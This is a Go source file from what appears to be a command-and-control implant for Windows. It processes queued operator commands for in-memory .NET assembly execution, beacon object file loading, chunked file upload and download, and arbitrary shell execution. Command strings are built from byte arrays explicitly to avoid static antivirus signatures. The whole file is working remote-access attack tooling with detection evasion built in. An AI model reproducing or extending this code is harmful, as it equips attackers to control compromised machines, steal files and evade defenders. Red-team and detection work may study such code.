// server/docker/payloads/Windows/command_processor.go

//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"

	//"os"
	"strings"
	"time"
)

// Command processor strings (constructed to avoid static signatures)
// Note: Command dispatch now uses numeric CommandType IDs (CmdInlineAssembly, CmdBof, etc.)
// defined in command_types.go. Only keeping strings needed for parsing.
var (
	// Used by parseDownloadCommand/parseUploadCommand
	cpCmdUpload   = string([]byte{0x75, 0x70, 0x6c, 0x6f, 0x61, 0x64})         // upload
	cpCmdDownload = string([]byte{0x64, 0x6f, 0x77, 0x6e, 0x6c, 0x6f, 0x61, 0x64}) // download
)

// ProcessNextCommand processes the next command in the queue
func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
	cq.mu.Lock()
	if len(cq.commands) == 0 {
		cq.mu.Unlock()
		return nil, nil
	}

	cmd := cq.commands[0]
	cq.commands = cq.commands[1:]
	cq.mu.Unlock()

	// Add this diagnostic
	//fmt.Fprintf(os.Stderr, "DIAGNOSTIC: Processing command type: %s\n", cmd.Command)
	//if strings.Contains(fmt.Sprintf("%v", cmd), "command_id") {
	//	fmt.Fprintf(os.Stderr, "WARNING: Command struct would print as: %v\n", cmd)
	//}

	// Set the current command in context
	cq.cmdContext.mu.Lock()
	cq.cmdContext.CurrentCommand = &cmd
	cq.cmdContext.mu.Unlock()

	// IMPORTANT: Apply session environment variables before executing any command
	cq.applySessionEnvironment()

	// Handle inline-assembly job management commands FIRST (by numeric ID)
	if cmd.CommandType == CmdInlineAssemblyJobs {
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobs]; exists {
			result := handler(cq.cmdContext, []string{})
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		} else {
			return &CommandResult{
				Command:     cmd,
				ErrorString: Err(E19),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}
	}

	// Handle inline-assembly-jobs-clean command
	if cmd.CommandType == CmdInlineAssemblyJobsClean {
		parts := strings.Fields(cmd.Command)
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobsClean]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:]
			}
			result := handler(cq.cmdContext, args)
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-jobs-stats command
	if cmd.CommandType == CmdInlineAssemblyJobsStats {
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobsStats]; exists {
			result := handler(cq.cmdContext, []string{})
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-output command WITH arguments
	if cmd.CommandType == CmdInlineAssemblyOutput {
		parts := strings.Fields(cmd.Command)
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyOutput]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:]
			}
			result := handler(cq.cmdContext, args)
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-kill command WITH arguments
	if cmd.CommandType == CmdInlineAssemblyKill {
		parts := strings.Fields(cmd.Command)
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyKill]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:]
			}
			result := handler(cq.cmdContext, args)
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly commands WITH data (actual assembly execution)
	if (cmd.CommandType == CmdInlineAssembly || cmd.CommandType == CmdInlineAssemblyAsync) && cmd.Data != "" {
		var testParse map[string]interface{}
		_ = json.Unmarshal([]byte(cmd.Data), &testParse)

		handlerID := cmd.CommandType
		if handler, exists := cq.cmdHandlers[handlerID]; exists {
			result := handler(cq.cmdContext, []string{})
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		} else {
			return &CommandResult{
				Command:     cmd,
				ErrorString: Err(E19),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}
	}

	// Handle async BOF commands WITH data
	if cmd.CommandType == CmdBofAsync && cmd.Data != "" {
		result := cq.processBOFAsync(cmd)
		return &result, nil
	}

	// Handle regular BOF commands WITH data
	if cmd.CommandType == CmdBof && cmd.Data != "" {
		result := cq.processBOF(cmd)
		return &result, nil
	}

	// Handle upload chunks
	if cmd.CommandType == CmdUpload && cmd.Data != "" {
		result, err := HandleUploadChunk(cmd, cq.cmdContext)
		if err != nil {
			return &CommandResult{
				Command:     cmd,
				Error:       err,
				ErrorString: err.Error(),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}
		return result, nil
	}

	// Handle download continuation
	if cmd.Filename != "" && cmd.CurrentChunk > 0 {

		cq.mu.Lock()
		downloadInfo, exists := cq.activeDownloads[cmd.Filename]
		cq.mu.Unlock()

		if !exists {
			return &CommandResult{
				Command:     cmd,
				Error:       fmt.Errorf(Err(E4)),
				ErrorString: Err(E4),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}

		if !downloadInfo.InProgress {
			return &CommandResult{
				Command:     cmd,
				Error:       fmt.Errorf(Err(E4)),
				ErrorString: Err(E4),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}

		result, err := GetNextFileChunk(downloadInfo.FilePath, cmd.CurrentChunk, cmd)
		if err != nil {
			return &CommandResult{
				Command:     cmd,
				Error:       err,
				ErrorString: err.Error(),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}

		cq.UpdateDownloadProgress(cmd.Filename, cmd.CurrentChunk)

		return result, nil
	}

	// Parse command for everything else
	cmdType := cmd.Command
	var cmdArgs []string

	// For BOF commands and variants, handle them specially (by numeric ID)
	if cmd.CommandType == CmdBof || cmd.CommandType == CmdBofAsync ||
		cmd.CommandType == CmdBofJobs || cmd.CommandType == CmdBofOutput || cmd.CommandType == CmdBofKill {
		parts := strings.Fields(cmd.Command)
		if len(parts) > 0 {
			cmdType = parts[0]
			cmdArgs = parts[1:]
		}
	} else {
		// Normal command processing
		// Special handling for download and upload commands to preserve spaces in file paths
		var args []string
		cmdLower := strings.ToLower(strings.TrimSpace(cmd.Command))

		if strings.HasPrefix(cmdLower, cpCmdDownload) {
			// Use special parsing for download that treats everything after "download" as one argument
			args = parseDownloadCommand(cmd.Command)
		} else if strings.HasPrefix(cmdLower, cpCmdUpload) {
			// Use special parsing for upload that treats everything after "upload" as one argument
			args = parseUploadCommand(cmd.Command)
		} else {
			// Use improved general parser for all other commands
			args = parseCommandLine(cmd.Command)
		}

		if len(args) == 0 {
			return &CommandResult{
				Command:     cmd,
				Error:       fmt.Errorf(Err(E1)),
				ErrorString: Err(E1),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}
		cmdType = args[0]
		cmdArgs = args[1:]
	}

	// Look up command handler by numeric ID
	if handler, exists := cq.cmdHandlers[cmd.CommandType]; exists {
		result := handler(cq.cmdContext, cmdArgs)

		// For file operations (download/upload), preserve the data from the handler
		if (cmd.CommandType == CmdDownload || cmd.CommandType == CmdUpload) &&
			(result.Command.Filename != "" || result.Command.Data != "") {
			// The handler set file operation data, merge with original command metadata
			result.Command.CommandID = cmd.CommandID
			result.Command.CommandDBID = cmd.CommandDBID
			result.Command.AgentID = cmd.AgentID
			result.Command.Timestamp = cmd.Timestamp
			// Keep the file data from the handler (Filename, CurrentChunk, TotalChunks, Data)
		} else {
			// For non-file operations, use the original command
			result.Command = cmd
		}

		result.CompletedAt = time.Now().Format(time.RFC3339)
		return &result, nil
	}

	// If no handler found (CommandType == CmdUnknown or unregistered), try shell command
	output, err := executeShellCommand(cmd.Command)
	if err != nil {
		return &CommandResult{
			Command:     cmd,
			Output:      output,
			Error:       err,
			ErrorString: err.Error(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}, nil
	}

	return &CommandResult{
		Command:     cmd,
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}, nil
}
